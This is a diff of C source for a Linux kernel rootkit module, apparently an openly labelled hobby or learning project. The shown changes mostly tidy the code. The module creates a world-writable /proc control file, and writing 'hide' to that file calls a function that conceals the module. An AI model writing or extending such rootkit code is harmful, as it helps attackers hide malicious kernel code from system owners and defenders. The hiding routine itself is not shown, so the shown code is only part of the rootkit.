@@ -9,24 +9,11 @@
  * from the variable PROC_FILE_NAME. Next, the action 
  * handlers for the file are registered.
  */
-#include "include/proc.h"
-#include "include/hide.h"
-#include "include/config.h"
+#include "header/proc.h"
+#include "header/hide.h"
+#include "header/config.h"
 
 
-/*
- * TODO: supplement the function
- *
- * The function is called when data is read from 
- * /proc/PROC_FILE_NAME.
- */
-ssize_t handler_read_proc_file(
-        struct file *file, char __user *buffer, 
-        size_t length, loff_t *data) {
-    printk("rootkit: read from  \"/proc/%s\" file: %ld", PROC_FILE_NAME, length);
-
-    return 0;
-}
 
 /*
  * The function is called when data is write in 
@@ -35,7 +22,8 @@ ssize_t handler_read_proc_file(
 ssize_t handler_write_proc_file(
         struct file *file, const char __user *buffer, 
         size_t length, loff_t *data) {
-    printk("rootkit: write in \"/proc/%s\" file: %ld", PROC_FILE_NAME, length);
+    printk("rootkit: write in \"/proc/%s\" file: %ld\n", 
+        PROC_FILE_NAME, length);
 
     if (strncmp(buffer, "hide", 4) == 0) {
         module_hide();
@@ -53,9 +41,8 @@ ssize_t handler_write_proc_file(
  * file in /proc/PROC_FILE_NAME.
  */
 const struct file_operations proc_file_fops = {
- .owner = THIS_MODULE,
- .read  = handler_read_proc_file,
- .write = handler_write_proc_file,
+    .owner = THIS_MODULE,
+    .write = handler_write_proc_file,
 };
 
 
@@ -64,7 +51,7 @@ const struct file_operations proc_file_fops = {
  * the file was successfully created and 0 if the file 
  * can not be created.
  */
-int create_proc_file() {
+int create_proc_file(void) {
     /*
     * Note: proc_create_entry seems that since the version 
     * of 3.10.0, the function of proc_create_entry() has 
@@ -77,13 +64,14 @@ int create_proc_file() {
     * #endif
     */
 
-    return (proc_create(PROC_FILE_NAME, 0666, NULL, &proc_file_fops) == NULL) ? 0 : 1;
+    return (proc_create(
+        PROC_FILE_NAME, 0666, NULL, &proc_file_fops) == NULL) ? 0 : 1;
 }
 
 
 /*
  * Deletes a file from the file system /proc.
  */
-void remove_proc_file() {
+void remove_proc_file(void) {
     remove_proc_entry(PROC_FILE_NAME, NULL);
 }
